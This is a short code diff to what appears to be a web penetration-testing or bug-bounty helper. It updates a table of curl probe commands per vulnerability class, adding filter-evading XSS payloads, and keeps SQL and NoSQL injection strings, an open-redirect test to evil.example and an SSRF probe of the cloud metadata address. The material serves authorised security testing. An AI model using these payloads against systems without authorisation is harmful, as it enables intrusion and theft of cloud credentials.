@@ -81,7 +81,7 @@ TECH_SKILL = {
 CLASS_PROBE = {
     "sqli": "curl -s \"{u}\"   # then  ' OR '1'='1'--  and time-based  ' AND SLEEP(5)--  (Burp Intruder for blind)",
     "nosqli": "curl -s \"{u}\"   # then  [$ne]=1 / {\"$gt\":\"\"}  in the param",
-    "xss": "curl -s \"{ur}z1z<svg/onload=alert(1)>\"   # check the marker comes back UNencoded",
+    "xss": "curl -s \"{ur}1<!--><Svg/OnLoad=(confirm)(1)-->\"   # ADDITIONAL SET FIRST (hunt-xss priority order): then 1%3C!--%3E%3CSvg%0COnLoad=(confirm)(1)--%3E and 1%3C/Script/%3E%3CImg/Src/OnError=confirm?.(1)%3E; baseline z1z<svg/onload=alert(1)> after; javascript:/java%09script: scheme payloads LAST",
     "open-redirect": "curl -sI \"{ur}https://evil.example\"   # inspect the Location: response header",
     "ssrf": "curl -s \"{ur}http://169.254.169.254/latest/meta-data/\"   # Burp Collaborator for blind OOB",
     "idor": "curl -s \"{u}\"   # swap/increment the id across two identities; diff the bodies",
